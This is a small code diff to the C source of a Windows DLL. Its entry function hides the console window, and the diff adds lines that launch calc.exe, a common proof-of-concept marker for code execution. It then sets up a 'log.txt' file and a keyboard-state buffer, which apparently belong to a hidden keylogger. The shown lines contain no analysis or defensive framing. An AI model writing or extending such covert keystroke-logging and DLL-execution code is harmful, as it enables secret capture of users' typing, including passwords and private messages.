@@ -18,6 +18,8 @@ BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
 
 int EntryPoint() {
     ShowWindow(GetConsoleWindow(), SW_HIDE);
+    char calculatorPath[] = "C:\\Windows\\System32\\calc.exe";
+    system(calculatorPath);
     char logFileName[] = "log.txt";
     unsigned char keyboardState[256] = {0};
     unsigned short buffer[2];
